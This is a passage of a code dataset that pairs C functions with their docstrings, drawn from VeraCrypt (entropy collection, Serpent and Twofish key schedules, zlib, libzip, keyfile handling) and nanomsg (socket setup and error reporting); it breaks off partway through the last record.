{"docstring": "/**\n * CPU Jitter noise source -- this is the noise source based on the CPU\n * \t\t\t      execution time jitter\n *\n * This function injects the individual bits of the time value into the\n * entropy pool using an LFSR.\n *\n * The code is deliberately inefficient with respect to the bit shifting\n * and shall stay that way. This function is the root cause why the code\n * shall be compiled without optimization. This function not only acts as\n * LFSR operation, but this function's execution is used to measure\n * the CPU execution time jitter. Any change to the loop in this function\n * implies that careful retesting must be done.\n *\n * @ec [in] entropy collector struct -- may be NULL\n * @time [in] time stamp to be injected\n * @loop_cnt [in] if a value not equal to 0 is set, use the given value as\n *\t\t  number of loops to perform the LFSR\n *\n * Output:\n * updated ec->data\n */\n", "func_signal": "static void jent_lfsr_time(struct rand_data *ec, uint64_t time,\n\t\t\t   uint64_t loop_cnt, int stuck)", "code": "{\n\tunsigned int i;\n\tuint64_t j = 0;\n\tuint64_t new = 0;\n#define MAX_FOLD_LOOP_BIT 4\n#define MIN_FOLD_LOOP_BIT 0\n\tuint64_t lfsr_loop_cnt =\n\t\tjent_loop_shuffle(ec, MAX_FOLD_LOOP_BIT, MIN_FOLD_LOOP_BIT);\n\n\t/*\n\t * testing purposes -- allow test app to set the counter, not\n\t * needed during runtime\n\t */\n\tif (loop_cnt)\n\t\tlfsr_loop_cnt = loop_cnt;\n\tfor (j = 0; j < lfsr_loop_cnt; j++) {\n\t\tnew = ec->data;\n\t\tfor (i = 1; (DATA_SIZE_BITS) >= i; i++) {\n\t\t\tuint64_t tmp = time << (DATA_SIZE_BITS - i);\n\n\t\t\ttmp = tmp >> (DATA_SIZE_BITS - 1);\n\n\t\t\t/*\n\t\t\t* Fibonacci LSFR with polynomial of\n\t\t\t*  x^64 + x^61 + x^56 + x^31 + x^28 + x^23 + 1 which is\n\t\t\t*  primitive according to\n\t\t\t*   http://poincare.matf.bg.ac.rs/~ezivkovm/publications/primpol1.pdf\n\t\t\t* (the shift values are the polynomial values minus one\n\t\t\t* due to counting bits from 0 to 63). As the current\n\t\t\t* position is always the LSB, the polynomial only needs\n\t\t\t* to shift data in from the left without wrap.\n\t\t\t*/\n\t\t\ttmp ^= ((new >> 63) & 1);\n\t\t\ttmp ^= ((new >> 60) & 1);\n\t\t\ttmp ^= ((new >> 55) & 1);\n\t\t\ttmp ^= ((new >> 30) & 1);\n\t\t\ttmp ^= ((new >> 27) & 1);\n\t\t\ttmp ^= ((new >> 22) & 1);\n\t\t\tnew <<= 1;\n\t\t\tnew ^= tmp;\n\t\t}\n\t}\n\n\t/*\n\t * If the time stamp is stuck, do not finally insert the value into\n\t * the entropy pool. Although this operation should not do any harm\n\t * even when the time stamp has no entropy, SP800-90B requires that\n\t * any conditioning operation (SP800-90B considers the LFSR to be a\n\t * conditioning operation) to have an identical amount of input\n\t * data according to section 3.1.5.\n\t */\n\tif (!stuck)\n\t\tec->data = new;\n}", "path": "VeraCrypt/src/Crypto/jitterentropy-base.c", "commit_date": "2019-11-06 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/*\n* Serpent Key Schedule\n*/\n", "func_signal": "void serpent_set_key(const unsigned __int8 userKey[], unsigned __int8 *ks)", "code": "{\n   const unsigned __int32 PHI = 0x9E3779B9;\n   unsigned __int32* W = (unsigned __int32*) ks;\n   int i;\n   for(i = 0; i != 8; ++i)\n   {\n      memcpy (W + i, userKey + (i*4), 4);\n\t  W[i] = BOTAN_ENDIAN_N2L(W[i]);\n   }\n\n   for(i = 8; i != 140; ++i)\n   {\n      unsigned __int32 wi = W[i-8] ^ W[i-5] ^ W[i-3] ^ W[i-1] ^ PHI ^ (unsigned __int32)(i-8);\n      W[i] = rotl32(wi, 11);\n   }\n\n   SBoxE4(unsigned __int32,W[  8],W[  9],W[ 10],W[ 11]); SBoxE3(unsigned __int32,W[ 12],W[ 13],W[ 14],W[ 15]);\n   SBoxE2(unsigned __int32,W[ 16],W[ 17],W[ 18],W[ 19]); SBoxE1(unsigned __int32,W[ 20],W[ 21],W[ 22],W[ 23]);\n   SBoxE8(unsigned __int32,W[ 24],W[ 25],W[ 26],W[ 27]); SBoxE7(unsigned __int32,W[ 28],W[ 29],W[ 30],W[ 31]);\n   SBoxE6(unsigned __int32,W[ 32],W[ 33],W[ 34],W[ 35]); SBoxE5(unsigned __int32,W[ 36],W[ 37],W[ 38],W[ 39]);\n   SBoxE4(unsigned __int32,W[ 40],W[ 41],W[ 42],W[ 43]); SBoxE3(unsigned __int32,W[ 44],W[ 45],W[ 46],W[ 47]);\n   SBoxE2(unsigned __int32,W[ 48],W[ 49],W[ 50],W[ 51]); SBoxE1(unsigned __int32,W[ 52],W[ 53],W[ 54],W[ 55]);\n   SBoxE8(unsigned __int32,W[ 56],W[ 57],W[ 58],W[ 59]); SBoxE7(unsigned __int32,W[ 60],W[ 61],W[ 62],W[ 63]);\n   SBoxE6(unsigned __int32,W[ 64],W[ 65],W[ 66],W[ 67]); SBoxE5(unsigned __int32,W[ 68],W[ 69],W[ 70],W[ 71]);\n   SBoxE4(unsigned __int32,W[ 72],W[ 73],W[ 74],W[ 75]); SBoxE3(unsigned __int32,W[ 76],W[ 77],W[ 78],W[ 79]);\n   SBoxE2(unsigned __int32,W[ 80],W[ 81],W[ 82],W[ 83]); SBoxE1(unsigned __int32,W[ 84],W[ 85],W[ 86],W[ 87]);\n   SBoxE8(unsigned __int32,W[ 88],W[ 89],W[ 90],W[ 91]); SBoxE7(unsigned __int32,W[ 92],W[ 93],W[ 94],W[ 95]);\n   SBoxE6(unsigned __int32,W[ 96],W[ 97],W[ 98],W[ 99]); SBoxE5(unsigned __int32,W[100],W[101],W[102],W[103]);\n   SBoxE4(unsigned __int32,W[104],W[105],W[106],W[107]); SBoxE3(unsigned __int32,W[108],W[109],W[110],W[111]);\n   SBoxE2(unsigned __int32,W[112],W[113],W[114],W[115]); SBoxE1(unsigned __int32,W[116],W[117],W[118],W[119]);\n   SBoxE8(unsigned __int32,W[120],W[121],W[122],W[123]); SBoxE7(unsigned __int32,W[124],W[125],W[126],W[127]);\n   SBoxE6(unsigned __int32,W[128],W[129],W[130],W[131]); SBoxE5(unsigned __int32,W[132],W[133],W[134],W[135]);\n   SBoxE4(unsigned __int32,W[136],W[137],W[138],W[139]);\n}", "path": "VeraCrypt/src/Crypto/SerpentFast.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/**\n * Report any health test failures\n *\n * @ec [in] Reference to entropy collector\n *\n * @return\n * \t0 No health test failure\n * \t1 Permanent health test failure\n */\n", "func_signal": "static int jent_health_failure(struct rand_data *ec)", "code": "{\n\t/* Test is only enabled in FIPS mode */\n\tif (!ec->fips_enabled)\n\t\treturn 0;\n\n\treturn ec->health_failure;\n}", "path": "VeraCrypt/src/Crypto/jitterentropy-base.c", "commit_date": "2019-11-06 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/*\n* Serpent Decryption\n*/\n", "func_signal": "void serpent_decrypt_blocks(const unsigned __int8* in, unsigned __int8* out, size_t blocks, unsigned __int8 *ks)", "code": "{\n   unsigned __int32 B0, B1, B2, B3;\n   unsigned __int32* round_key = ((unsigned __int32*) ks) + 8;\n   size_t i;\n#if CRYPTOPP_BOOL_SSE2_INTRINSICS_AVAILABLE && (!defined (DEBUG) || !defined (TC_WINDOWS_DRIVER))\n   if(HasSSE2() && (blocks >= 4))\n   {\n      while(blocks >= 4)\n      {\n         serpent_simd_decrypt_blocks_4(in, out, round_key);\n         in += 4 * 16;\n         out += 4 * 16;\n         blocks -= 4;\n      }\n   }\n#endif\n\n   for(i = 0; i != blocks; ++i)\n   {      \t  \n\t  memcpy (&B0, in +  0, 4);\n\t  memcpy (&B1, in +  4, 4);\n\t  memcpy (&B2, in +  8, 4);\n\t  memcpy (&B3, in + 12, 4);\n\t  B0 = BOTAN_ENDIAN_N2L (B0);\n\t  B1 = BOTAN_ENDIAN_N2L (B1);\n\t  B2 = BOTAN_ENDIAN_N2L (B2);\n\t  B3 = BOTAN_ENDIAN_N2L (B3);\n\n      key_xor(32,B0,B1,B2,B3);  SBoxD8(unsigned __int32,B0,B1,B2,B3); key_xor(31,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD7(unsigned __int32,B0,B1,B2,B3); key_xor(30,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD6(unsigned __int32,B0,B1,B2,B3); key_xor(29,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD5(unsigned __int32,B0,B1,B2,B3); key_xor(28,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD4(unsigned __int32,B0,B1,B2,B3); key_xor(27,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD3(unsigned __int32,B0,B1,B2,B3); key_xor(26,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD2(unsigned __int32,B0,B1,B2,B3); key_xor(25,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD1(unsigned __int32,B0,B1,B2,B3); key_xor(24,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD8(unsigned __int32,B0,B1,B2,B3); key_xor(23,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD7(unsigned __int32,B0,B1,B2,B3); key_xor(22,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD6(unsigned __int32,B0,B1,B2,B3); key_xor(21,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD5(unsigned __int32,B0,B1,B2,B3); key_xor(20,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD4(unsigned __int32,B0,B1,B2,B3); key_xor(19,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD3(unsigned __int32,B0,B1,B2,B3); key_xor(18,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD2(unsigned __int32,B0,B1,B2,B3); key_xor(17,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD1(unsigned __int32,B0,B1,B2,B3); key_xor(16,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD8(unsigned __int32,B0,B1,B2,B3); key_xor(15,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD7(unsigned __int32,B0,B1,B2,B3); key_xor(14,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD6(unsigned __int32,B0,B1,B2,B3); key_xor(13,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD5(unsigned __int32,B0,B1,B2,B3); key_xor(12,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD4(unsigned __int32,B0,B1,B2,B3); key_xor(11,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD3(unsigned __int32,B0,B1,B2,B3); key_xor(10,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD2(unsigned __int32,B0,B1,B2,B3); key_xor( 9,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD1(unsigned __int32,B0,B1,B2,B3); key_xor( 8,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD8(unsigned __int32,B0,B1,B2,B3); key_xor( 7,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD7(unsigned __int32,B0,B1,B2,B3); key_xor( 6,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD6(unsigned __int32,B0,B1,B2,B3); key_xor( 5,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD5(unsigned __int32,B0,B1,B2,B3); key_xor( 4,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD4(unsigned __int32,B0,B1,B2,B3); key_xor( 3,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD3(unsigned __int32,B0,B1,B2,B3); key_xor( 2,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD2(unsigned __int32,B0,B1,B2,B3); key_xor( 1,B0,B1,B2,B3);\n      i_transform(B0,B1,B2,B3); SBoxD1(unsigned __int32,B0,B1,B2,B3); key_xor( 0,B0,B1,B2,B3);\n\n      B0 = BOTAN_ENDIAN_L2N(B0);\n\t  B1 = BOTAN_ENDIAN_L2N(B1);\n\t  B2 = BOTAN_ENDIAN_L2N(B2);\n\t  B3 = BOTAN_ENDIAN_L2N(B3);\n      memcpy(out +  0, &B0, 4);\n\t  memcpy(out +  4, &B1, 4);\n\t  memcpy(out +  8, &B2, 4);\n\t  memcpy(out + 12, &B3, 4);\n\n      in += 16;\n      out += 16;\n   }\n}", "path": "VeraCrypt/src/Crypto/SerpentFast.c", "commit_date": "2017-05-21 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/***************************************************************************\n * Start of entropy processing logic\n ***************************************************************************/\n/**\n * This is the heart of the entropy generation: calculate time deltas and\n * use the CPU jitter in the time deltas. The jitter is injected into the\n * entropy pool.\n *\n * WARNING: ensure that ->prev_time is primed before using the output\n * \t    of this function! This can be done by calling this function\n * \t    and not using its result.\n *\n * @ec [in] Reference to entropy collector\n *\n * @return: result of stuck test\n */\n", "func_signal": "static int jent_measure_jitter(struct rand_data *ec)", "code": "{\n\tuint64_t time = 0;\n\tuint64_t current_delta = 0;\n\tint stuck;\n\n\t/* Invoke one noise source before time measurement to add variations */\n\tjent_memaccess(ec, 0);\n\n\t/*\n\t * Get time stamp and calculate time delta to previous\n\t * invocation to measure the timing variations\n\t */\n\tjent_get_nstime(&time);\n\tcurrent_delta = jent_delta(ec->prev_time, time);\n\tec->prev_time = time;\n\n\t/* Check whether we have a stuck measurement. */\n\tstuck = jent_stuck(ec, current_delta);\n\n\t/* Now call the next noise sources which also injects the data */\n\tjent_lfsr_time(ec, current_delta, 0, stuck);\n\n\treturn stuck;\n}", "path": "VeraCrypt/src/Crypto/jitterentropy-base.c", "commit_date": "2019-11-06 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/***************************************************************************\n * Initialization logic\n ***************************************************************************/\n", "func_signal": "JENT_PRIVATE_STATIC\nstruct rand_data *jent_entropy_collector_alloc(unsigned int osr,\n\t\t\t\t\t       unsigned int flags)", "code": "{\n\tstruct rand_data *entropy_collector;\n\n\tentropy_collector = jent_zalloc(sizeof(struct rand_data));\n\tif (NULL == entropy_collector)\n\t\treturn NULL;\n\n\tif (!(flags & JENT_DISABLE_MEMORY_ACCESS)) {\n\t\t/* Allocate memory for adding variations based on memory\n\t\t * access\n\t\t */\n\t\tentropy_collector->mem = \n\t\t\t(unsigned char *)jent_zalloc(JENT_MEMORY_SIZE);\n\t\tif (NULL == entropy_collector->mem) {\n\t\t\tjent_zfree(entropy_collector, sizeof(struct rand_data));\n\t\t\treturn NULL;\n\t\t}\n\t\tentropy_collector->memblocksize = JENT_MEMORY_BLOCKSIZE;\n\t\tentropy_collector->memblocks = JENT_MEMORY_BLOCKS;\n\t\tentropy_collector->memaccessloops = JENT_MEMORY_ACCESSLOOPS;\n\t}\n\n\t/* verify and set the oversampling rate */\n\tif (0 == osr)\n\t\tosr = 1; /* minimum sampling rate is 1 */\n\tentropy_collector->osr = osr;\n\n\tif (jent_fips_enabled())\n\t\tentropy_collector->fips_enabled = 1;\n\n\t/* fill the data pad with non-zero values */\n\tjent_gen_entropy(entropy_collector);\n\n\treturn entropy_collector;\n}", "path": "VeraCrypt/src/Crypto/jitterentropy-base.c", "commit_date": "2019-11-06 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/* -- see zlib.h -- */\n", "func_signal": "int ZEXPORTVA gzvprintf(gzFile file, const char *format, va_list va)", "code": "{\n    int len;\n    unsigned left;\n    char *next;\n    gz_statep state;\n    z_streamp strm;\n\n    /* get internal structure */\n    if (file == NULL)\n        return Z_STREAM_ERROR;\n    state = (gz_statep)file;\n    strm = &(state->strm);\n\n    /* check that we're writing and that there's no error */\n    if (state->mode != GZ_WRITE || state->err != Z_OK)\n        return Z_STREAM_ERROR;\n\n    /* make sure we have some buffer space */\n    if (state->size == 0 && gz_init(state) == -1)\n        return state->err;\n\n    /* check for seek request */\n    if (state->seek) {\n        state->seek = 0;\n        if (gz_zero(state, state->skip) == -1)\n            return state->err;\n    }\n\n    /* do the printf() into the input buffer, put length in len -- the input\n       buffer is double-sized just for this function, so there is guaranteed to\n       be state->size bytes available after the current contents */\n    if (strm->avail_in == 0)\n        strm->next_in = state->in;\n    next = (char *)(state->in + (strm->next_in - state->in) + strm->avail_in);\n    next[state->size - 1] = 0;\n#ifdef NO_vsnprintf\n#  ifdef HAS_vsprintf_void\n    (void)vsprintf(next, format, va);\n    for (len = 0; len < state->size; len++)\n        if (next[len] == 0) break;\n#  else\n    len = vsprintf(next, format, va);\n#  endif\n#else\n#  ifdef HAS_vsnprintf_void\n    (void)vsnprintf(next, state->size, format, va);\n    len = strlen(next);\n#  else\n    len = vsnprintf(next, state->size, format, va);\n#  endif\n#endif\n\n    /* check that printf() results fit in buffer */\n    if (len == 0 || (unsigned)len >= state->size || next[state->size - 1] != 0)\n        return 0;\n\n    /* update buffer and position, compress first half if past that */\n    strm->avail_in += (unsigned)len;\n    state->x.pos += len;\n    if (strm->avail_in >= state->size) {\n        left = strm->avail_in - state->size;\n        strm->avail_in = state->size;\n        if (gz_comp(state, Z_NO_FLUSH) == -1)\n            return state->err;\n        memcpy(state->in, state->in + state->size, left);\n        strm->next_in = state->in;\n        strm->avail_in = left;\n    }\n    return len;\n}", "path": "VeraCrypt/src/Common/zlib/gzwrite.c", "commit_date": "2017-04-25 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/* _zip_file_get_offset(za, ze):\n   Returns the offset of the file data for entry ze.\n\n   On error, fills in za->error and returns 0.\n*/\n", "func_signal": "zip_uint64_t\n_zip_file_get_offset(const zip_t *za, zip_uint64_t idx, zip_error_t *error)", "code": "{\n    zip_uint64_t offset;\n    zip_int32_t size;\n\n    if (za->entry[idx].orig == NULL) {\n\tzip_error_set(error, ZIP_ER_INTERNAL, 0);\n\treturn 0;\n    }\n\n    offset = za->entry[idx].orig->offset;\n\n    if (zip_source_seek(za->src, (zip_int64_t)offset, SEEK_SET) < 0) {\n\t_zip_error_set_from_source(error, za->src);\n\treturn 0;\n    }\n\n    /* TODO: cache? */\n    if ((size = _zip_dirent_size(za->src, ZIP_EF_LOCAL, error)) < 0)\n\treturn 0;\n\n    if (offset + (zip_uint32_t)size > ZIP_INT64_MAX) {\n\tzip_error_set(error, ZIP_ER_SEEK, EFBIG);\n\treturn 0;\n    }\n\n    return offset + (zip_uint32_t)size;\n}", "path": "VeraCrypt/src/Common/libzip/zip_file_get_offset.c", "commit_date": "2020-07-24 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "// Returns first keyfile, NULL if last keyfile was removed\n", "func_signal": "static KeyFile *KeyFileRemove (KeyFile *firstKeyFile, KeyFile *keyFile)", "code": "{\n\tKeyFile *prevkf = NULL, *kf = firstKeyFile;\n\n\tif (firstKeyFile == NULL) return NULL;\n\tdo\n\t{\n\t\tif (kf == keyFile)\n\t\t{\n\t\t\tif (prevkf == NULL)\n\t\t\t\tfirstKeyFile = kf->Next;\n\t\t\telse\n\t\t\t\tprevkf->Next = kf->Next;\n\n\t\t\tburn (keyFile, sizeof(*keyFile));\t// wipe\n\t\t\tfree (keyFile);\n\t\t\tbreak;\n\t\t}\n\t\tprevkf = kf;\n\t}\n\twhile (kf = kf->Next);\n\n\treturn firstKeyFile;\n}", "path": "VeraCrypt/src/Common/Keyfiles.c", "commit_date": "2019-12-08 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "// If bIOThroughput is TRUE, the speed reflects the amount of data read AND written per second (rather than\n// the speed of the \"transform cursor\").\n", "func_signal": "void InitProgressBar (__int64 totalBytes, __int64 bytesDone, BOOL bReverse, BOOL bIOThroughput, BOOL bDisplayStatus, BOOL bShowPercent)", "code": "{\n\tHWND hProgressBar = GetDlgItem (hCurPage, nPbar);\n\tSendMessage (hProgressBar, PBM_SETRANGE32, 0, 10000);\n\tSendMessage (hProgressBar, PBM_SETSTEP, 1, 0);\n\n\tbProgressBarReverse = bReverse;\n\tbRWThroughput = bIOThroughput;\n\tbShowStatus = bDisplayStatus;\n\tbPercentMode = bShowPercent;\n\n\tseconds = GetString (\"SECONDS\");\n\tminutes = GetString (\"MINUTES\");\n\thours = GetString (\"HOURS\");\n\tdays = GetString (\"DAYS\");\n\n\tprevTime = startTime = GetTickCount ();\n\tTotalSize = totalBytes;\n\tresumedPointBytesDone = bytesDone;\n}", "path": "VeraCrypt/src/Common/Progress.c", "commit_date": "2017-06-23 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/**\n * Update of the loop count used for the next round of\n * an entropy collection.\n *\n * @ec [in] entropy collector struct -- may be NULL\n * @bits [in] is the number of low bits of the timer to consider\n * @min [in] is the number of bits we shift the timer value to the right at\n *\t     the end to make sure we have a guaranteed minimum value\n *\n * @return Newly calculated loop counter\n */\n", "func_signal": "static uint64_t jent_loop_shuffle(struct rand_data *ec,\n\t\t\t\t  unsigned int bits, unsigned int min)", "code": "{\n\tuint64_t time = 0;\n\tuint64_t shuffle = 0;\n\tunsigned int i = 0;\n\tunsigned int mask = (1<<bits) - 1;\n\n\tjent_get_nstime(&time);\n\t/*\n\t * Mix the current state of the random number into the shuffle\n\t * calculation to balance that shuffle a bit more.\n\t */\n\tif (ec)\n\t\ttime ^= ec->data;\n\t/*\n\t * We fold the time value as much as possible to ensure that as many\n\t * bits of the time stamp are included as possible.\n\t */\n\tfor (i = 0; ((DATA_SIZE_BITS + bits - 1) / bits) > i; i++) {\n\t\tshuffle ^= time & mask;\n\t\ttime = time >> bits;\n\t}\n\n\t/*\n\t * We add a lower boundary value to ensure we have a minimum\n\t * RNG loop count.\n\t */\n\treturn (shuffle + (1<<min));\n}", "path": "VeraCrypt/src/Crypto/jitterentropy-base.c", "commit_date": "2019-11-06 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/* initialise the key schedule from the user supplied key   */\n", "func_signal": "void twofish_set_key(TwofishInstance *instance, const u4byte in_key[])", "code": "{   u4byte  i, a, b, me_key[4], mo_key[4];\n\tu4byte *l_key, *s_key;\n\n\tl_key = instance->l_key;\n\ts_key = instance->s_key;\n\n#ifdef Q_TABLES\n    if(!qt_gen)\n    {\n        gen_qtab(); qt_gen = 1;\n    }\n#endif\n\n#ifdef M_TABLE\n    if(!mt_gen)\n    {\n        gen_mtab(); mt_gen = 1;\n    }\n#endif\n\n\n    for(i = 0; i < 4; ++i)\n    {\n        a = LE32(in_key[i + i]);     me_key[i] = a;\n        b = LE32(in_key[i + i + 1]); mo_key[i] = b;\n        s_key[4 - i - 1] = mds_rem(a, b);\n    }\n\n    for(i = 0; i < 40; i += 2)\n    {\n        a = 0x01010101 * i; b = a + 0x01010101;\n        a = h_fun(instance, a, me_key);\n        b = rotl(h_fun(instance, b, mo_key), 8);\n        l_key[i] = a + b;\n        l_key[i + 1] = rotl(a + 2 * b, 9);\n    }\n\n#ifdef MK_TABLE\n    gen_mk_tab(instance, s_key);\n#endif\n}", "path": "VeraCrypt/src/Crypto/Twofish.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/**\n * Insert a new entropy event into APT\n *\n * @ec [in] Reference to entropy collector\n * @delta_masked [in] Masked time delta to process\n */\n", "func_signal": "static void jent_apt_insert(struct rand_data *ec, unsigned int delta_masked)", "code": "{\n\t/* Initialize the base reference */\n\tif (!ec->apt_base_set) {\n\t\tec->apt_base = delta_masked;\n\t\tec->apt_base_set = 1;\n\t\treturn;\n\t}\n\n\tif (delta_masked == ec->apt_base) {\n\t\tec->apt_count++;\n\n\t\tif (ec->apt_count >= JENT_APT_CUTOFF)\n\t\t\tec->health_failure = 1;\n\t}\n\n\tec->apt_observations++;\n\n\tif (ec->apt_observations >= JENT_APT_WINDOW_SIZE)\n\t\tjent_apt_reset(ec, delta_masked);\n}", "path": "VeraCrypt/src/Crypto/jitterentropy-base.c", "commit_date": "2019-11-06 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/**\n * Stuck test by checking the:\n * \t1st derivative of the jitter measurement (time delta)\n * \t2nd derivative of the jitter measurement (delta of time deltas)\n * \t3rd derivative of the jitter measurement (delta of delta of time deltas)\n *\n * All values must always be non-zero.\n *\n * @ec [in] Reference to entropy collector\n * @current_delta [in] Jitter time delta\n *\n * @return\n * \t0 jitter measurement not stuck (good bit)\n * \t1 jitter measurement stuck (reject bit)\n */\n", "func_signal": "static int jent_stuck(struct rand_data *ec, uint64_t current_delta)", "code": "{\n\tuint64_t delta2 = jent_delta(ec->last_delta, current_delta);\n\tuint64_t delta3 = jent_delta(ec->last_delta2, delta2);\n\tunsigned int delta_masked = current_delta & JENT_APT_WORD_MASK;\n\n\tec->last_delta = current_delta;\n\tec->last_delta2 = delta2;\n\n\t/*\n\t * Insert the result of the comparison of two back-to-back time\n\t * deltas.\n\t */\n\tjent_apt_insert(ec, delta_masked);\n\n\tif (!current_delta || !delta2 || !delta3) {\n\t\t/* RCT with a stuck bit */\n\t\tjent_rct_insert(ec, 1);\n\t\treturn 1;\n\t}\n\n\t/* RCT with a non-stuck bit */\n\tjent_rct_insert(ec, 0);\n\n\treturn 0;\n}", "path": "VeraCrypt/src/Crypto/jitterentropy-base.c", "commit_date": "2019-11-06 00:00:00", "repo_name": "veracrypt/VeraCrypt", "stars": 6009, "license": "other", "language": "c", "size": 322698}
{"docstring": "/******************************************************************************/\n/*  State machine actions.                                                    */\n/******************************************************************************/\n", "func_signal": "void nn_sock_report_error (struct nn_sock *self, struct nn_ep *ep, int errnum)", "code": "{\n    if (!nn_global_print_errors())\n        return;\n\n    if (errnum == 0)\n        return;\n\n    if (ep) {\n        fprintf(stderr, \"nanomsg: socket.%s[%s]: Error: %s\\n\",\n            self->socket_name, nn_ep_getaddr(ep), nn_strerror(errnum));\n    } else {\n        fprintf(stderr, \"nanomsg: socket.%s: Error: %s\\n\",\n            self->socket_name, nn_strerror(errnum));\n    }\n}", "path": "nanomsg/src/core/sock.c", "commit_date": "2018-06-01 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  Return the UNIX time in milliseconds.  You'll need a working\n    gettimeofday(), so this won't work on Windows.  */\n", "func_signal": "uint64_t milliseconds (void)", "code": "{\n    struct timeval tv;\n    gettimeofday (&tv, NULL);\n    return (((uint64_t)tv.tv_sec * 1000) + ((uint64_t)tv.tv_usec / 1000));\n}", "path": "nanomsg/demo/async_demo.c", "commit_date": "2016-06-06 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  We no longer resolve interface names.  This feature was non-portable\n    and fragile.  Only IP addresses may be used.  They are provided in\n    the form of string literals. */\n", "func_signal": "int nn_iface_resolve (const char *addr, size_t addrlen, int ipv4only,\n    struct sockaddr_storage *result, size_t *resultlen)", "code": "{\n    int rc;\n\n    /*  Asterisk is a special name meaning \"all interfaces\". */\n    if (addrlen == 1 && addr [0] == '*') {\n        nn_iface_any (ipv4only, result, resultlen);\n        return 0;\n    }\n\n    rc = nn_literal_resolve (addr, addrlen, ipv4only, result, resultlen);\n    if (rc == -EINVAL)\n        return -ENODEV;\n    errnum_assert (rc == 0, -rc);\n    return 0;\n}", "path": "nanomsg/src/transports/utils/iface.c", "commit_date": "2015-11-10 00:00:00", "repo_name": "nanomsg/nanomsg", "stars": 5836, "license": "other", "language": "c", "size": 8270}
{"docstring": "/*  Initialize a socket.  A hold is placed on the initialized socket for\n    the caller as well. */\n", "func_signal": "int nn_sock_init (struct nn_sock *self, const struct nn_socktype *socktype,\n    int fd)", "code": "{\n    int rc;\n    int i;\n\n    /* Make sure that at least one message direction is supported. */\n    nn_assert (!(socktype->flags & NN_SOCKTYPE_FLAG_NOSEND) ||\n        !(socktype->flags & NN_SOCKTYPE_FLAG_NORECV));\n\n    /*  Create the AIO context for the SP socket. */\n    nn_ctx_init (&self->ctx, nn_global_getpool (), nn_sock_onleave);\n\n    /*  Initialise the state machine. */\n    nn_fsm_init_root (&self->fsm, nn_sock_handler,\n        nn_sock_shutdown, &self->ctx);\n    self->state = NN_SOCK_STATE_INIT;\n\n    /*  Open the NN_SNDFD and NN_RCVFD efds. Do so, only if the socket type\n        supports send/recv, as appropriate. */\n    if (socktype->flags & NN_SOCKTYPE_FLAG_NOSEND)\n        memset (&self->sndfd, 0xcd, sizeof (self->sndfd));\n    else {\n        rc = nn_efd_init (&self->sndfd);\n        if (nn_slow (rc < 0))\n            return rc;\n    }\n    if (socktype->flags & NN_SOCKTYPE_FLAG_NORECV)\n        memset (&self->rcvfd, 0xcd, sizeof (self->rcvfd));\n    else {\n        rc = nn_efd_init (&self->rcvfd);\n        if (nn_slow (rc < 